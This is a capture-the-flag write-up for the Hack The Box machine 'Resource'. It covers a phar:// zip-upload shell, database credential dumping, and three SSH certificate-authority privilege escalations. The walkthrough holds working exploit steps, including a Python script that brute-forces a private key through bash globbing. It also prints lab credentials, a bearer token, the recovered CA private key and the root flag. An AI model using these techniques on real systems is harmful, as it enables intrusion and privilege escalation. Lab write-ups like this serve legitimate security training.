---
layout: post
title: "HTB Resource: Walkthrough"
date: 2024-12-26 10:00:00 +0000
categories: [HTB]
tags: [HTB, File Upload, Bash Globbing, SSH-Certs]
---

![image](https://github.com/user-attachments/assets/8783ebc9-b696-4318-9a94-3e03c089a943)

Starting off, we encounter a web application thats vulnerable to a zip archive file upload vulnerability, allowing us to utilize `phar://` to execute a shell and gain a foothold onto the system. Following this, we can dump the SQL database on the host, and are able to retrieve a set of credentials because of it. Then, a long sequence of multiple SSH Certificate Authority misconfigurations are abused to escalate privileges 3 times.


## 0) Machine Overview
1. [Scans](#1-scans)
2. [Web Enumeration and Exploitation](#2-web-enumeration-and-exploitation)
3. [Foothold](#3-foothold)
4. [SSH Certificate Authority](#4-ssh-certificate-authority)
5. [SSH Certificate Authority 2](#5-ssh-certificate-authority-2)
6. [SSH Certificate Authority 3](#6-ssh-certificate-authority-3)

## 1) Scans

```
Nmap scan report for 10.10.11.27
Host is up (0.040s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                       
```

## 2) Web Enumeration and Exploitation
The machine hosts a file upload on the webserver that accepts zip archives. Additionally, there is a potential LFI in ?page=login:

![image](https://github.com/user-attachments/assets/f067f42a-b732-4948-8b31-87f460f5c432)

Immediately i think of phar/zip file upload vulnerabilities. 

We can zip pentestmonkey’s php reverse shell into shell.zip, and upload it. Once uploaded, there is an option to download it, which intercepting it shows where its stored. Perfect.

![image](https://github.com/user-attachments/assets/7d0def16-6671-4579-8426-e5f860e2d007)

phar:// to run the script thats inside the zip archive and get a shell.
```
http://itrc.ssg.htb/?page=phar://./uploads/9f6c126f9fd52101a6d7cdfd9a9c9916fd42dbde.zip%2Fshell

#we dont need to add .php since phar appends it itself.
```

## 3) Foothold

Dumping the SQL DB, we find some hashes, didnt prove useful tho as theyre bcrypt.

![image](https://github.com/user-attachments/assets/c874c40e-d92f-4684-8c29-eeb3d68b6f31)

We do find interesting chat messages though.
```
mysql --host=db --user=jj --password=ugEG5rR5SG8uPd -e "select * from messages;" resourcecenter

23      We're having some issues with the signing process. I'll get back to you once we have that resolved.        2       2024-02-04 14:25:04     4       NULL    NULL
24      Can you attach a HAR file where the issue happens so the web team can troubleshoot?     1 2024-02-04 16:12:44      5       NULL    NULL
25      Attached.       2       2024-02-04 16:47:23     5       ../uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip    failure.zip
```

So they seem to hint at a specific zip file, which contains a HAR file:

![image](https://github.com/user-attachments/assets/5c638e8d-8875-4355-8393-414b19468890)

## 4) SSH Certificate Authority
We can now SSH in. Then we’re met with a “decomission_old_ca” folder, with a ton of keys:

![image](https://github.com/user-attachments/assets/bcafe0a8-596e-4529-ab2b-aa1fd8b4a5be)

Whats mainly of interest to us is the ca-itrc private key. What this will let us do is sign a public key, generating a certificate, that we can provide alongside our private key and essentially allow us to authenticate as any user we want. The key is that for any user we’d want access to, we’d have to create that certificate specifying the identity(user) we want it to work for. 
```
#So lets create a keypair first off:
ssh-keygen -t rsa -b 4096

#Next, we'll utilize the CA private key to sign our public key, and specify the user we want to be able to authenticate as:
ssh-keygen -s /path/to/ca-privatekey -I my_cert_id -n root -V +52w id_rsa.pub

#That would return a certificate file for us. With that, we can use it to authenticate now as root:
ssh root@10.10.11.27 -i party -o CertificateFile=party-cert.pub
```

## 5) SSH Certificate Authority 2

Now if we go to zzinters home directory, we notice a new interesting file named `sign_key_api.sh`, which seems to do pretty much the same thing we just did, but via an API on a different subdomain.
```
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Seems like we can generate another certificate for any of those 4 principals. I tried all of them but support was the only one that worked:
```
bash sign_key_apy.sh root.pub testy support

#that returns us a cert, which we can take alongside the private key again, and authenticate, but this time we'll do it on port 2222, since that should hopefully be the host machine, which it is.

ssh support@10.10.11.27 -p 2222 -i support_rsa -o CertificateFile=support.cert
```

Now there was nothing noteworthy unfortunately. However, there is a file on the file system that actually shows you what possible principals are available to i guess “imitate” when generating the certificate. That file is ./etc/ssh/auth_principals . Once in that folder, we see principals for all 3 users:

![image](https://github.com/user-attachments/assets/5563d113-6112-4ca8-b77f-c6352dc630e5)

We can try performing that same curl command ourselves and substituting root_user in as the prinicipal, but its prevented unfortunately due to hardening. Our next bet is to generate one for zzinter. We’ll just take the script offline and add “zzinter_temp” into the allowed principals and run it, making sure to add that domain to our /etc/hosts:
```

$ bash api.sh zzinter.pub hello zzinter_temp                                                      
ssh-rsa-cert-v01@openssh.com AAAAHHNzaC1yc2EtY2VydC12MDFAb3BlbnNzaC5jb20AAAAgUNkl+Ifi2MD2l4uZ4NhKFxFkWbP5d2VKMVIPE7+OgfMAAAADAQABAAACAQDAmRrSQJT81twoGZZLv4ESxTK/yRRRZoEKoqaPE9l2TEoSC2r62sLcXILGQhWc5+L6aQ4bFC6UKcMO9kegWDP/S7Atpw46rWkJXxT0AuNQd5Jq+MJCJWrwHRFZJII5X607SKbxXCVTsMMZuy2wgfRNuXUJg9VIm8sJtnH9MvsEGQJdACRSnB2D6kSi4NZG4+UpJpcZN5lVTT/8VL8K554amACmrF0+2kvBLDtE7IsLnxaoswF4Ie0aKSvg9qmAS5/9TsNxfGWDpRktPOFwkpzHisdZPqfL5gF0WvXQGP2uWBn1Iprwjyp2FQh9pbIA4eQAdWtGxUVl2ajk8Jt38yPtrHZEvboI4jrFbblhpBGWS9SGppcB3CEtWIwKAW6EEVTtO4+IKy3Dma7e+I8E0RqCbWYG1wPs7LN0NJCBoQkunBnwXPzQWphYFGCs/NGZDByJNT+4h+Pi4w1FqtHdn5lkFq5Xyx7/Y5EOKNAyXvAW1oFtJxerQqmZS8rI+bWAhDBMdrbyunLJ7v3OU/ENeBwf5aT1Rmzr/J/sUpWlaBBwuJQsnCSIgh5M8UWg56KSFJUeX+UT4RSvYilcuHTTd2D7VirbwmTGGEA1PenjkuT9e7g/DbmCXSf1L3UK38kVusVmG3Z4A6w81zqbjrs2yZiPqEo/k0IBBM9pCqv1ZAVcyQAAAAAAAAAxAAAAAQAAAAVoZWxsbwAAABAAAAAMenppbnRlcl90ZW1wAAAAAGar2CH//////////wAAAAAAAACCAAAAFXBlcm1pdC1YMTEtZm9yd2FyZGluZwAAAAAAAAAXcGVybWl0LWFnZW50LWZvcndhcmRpbmcAAAAAAAAAFnBlcm1pdC1wb3J0LWZvcndhcmRpbmcAAAAAAAAACnBlcm1pdC1wdHkAAAAAAAAADnBlcm1pdC11c2VyLXJjAAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIHg8Cudy1ShyYfqzC3ANlgAcW7Q4MoZuezAE8mNFSmxAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEACqbNyHYkrYF9rNoBkYsGNGHFqiNLPP39f5bhXBYRpA+uczq5eLYwlqSrUkCZxUK3dUSQxqScF13w4Kgg09OkE kali@kali
```

## 6) SSH Certificate Authority 3
Once ssh’d in, we have sudo privileges over a new script:

![image](https://github.com/user-attachments/assets/38ff817e-e80b-412d-b299-9f542b22d58f)

If we cat it out, it seems to function quite similar to all the other things we’ve just done. But theres a catch. It has a vulnerability in its code, where it checks if the contents of the ca_file provided is the same as the one in /etc/ssh/ca-it

![image](https://github.com/user-attachments/assets/61fb5149-00bd-4122-be8b-1262fae2d51f)


What this allows us to do is perform a “Bash Globbing” attack, which essentially lets us slowly bruteforce the contents of the ca-it file by appending * after each loop of base64 characters (thats what is contained within a private key), allowing us to generate our own certificates and escalate. To do this, a simple python script will suffice, however it will take quite a while:
```

import subprocess

# SSH key elements
header = "-----BEGIN OPENSSH PRIVATE KEY-----"
footer = "-----END OPENSSH PRIVATE KEY-----"
ba64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
key = []
line= 0


# Iterates over each character to test if it's the next correct one
while True:
    for char in ba64chars:
    	# Constructs a test key with *
        testKey = f"{header}\n{''.join(key)}{char}*"
        with open("ca-test", "w") as f:
            f.write(testKey)
        proc = subprocess.run(
            ["sudo", "/opt/sign_key.sh", "ca-test", "xpl.pub", "root", "root_user", "1"],
            capture_output=True
        )
        
        # If matched, Error code 1
        if proc.returncode == 1:
            key.append(char)
            # Adds a newline every 70 characters
            if len(key) > 1 and (len(key) - line) % 70 == 0:
                key.append("\n")
                line += 1
            break
    else:
        break

# Constructs the final SSH key from the discovered characters
caKey = f"{header}\n{''.join(key)}\n{footer}"
print("The final leaked ca-it is: ", caKey)
with open("ca-it", "w") as f:
    f.write(caKey)
```

Once its done, we’re left with the CA key:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
```

Now, lets use this to generate our final certificate:
```
ssh-keygen -s ca-it -I hello -n root_user -V +52w party.pub

ssh root@localhost -o CertificateFile=party-cert.pub -i party -p 2222

cat root.txt
aaf8b2e5a88afd7741e9846b88d4721f
```
Rooted.









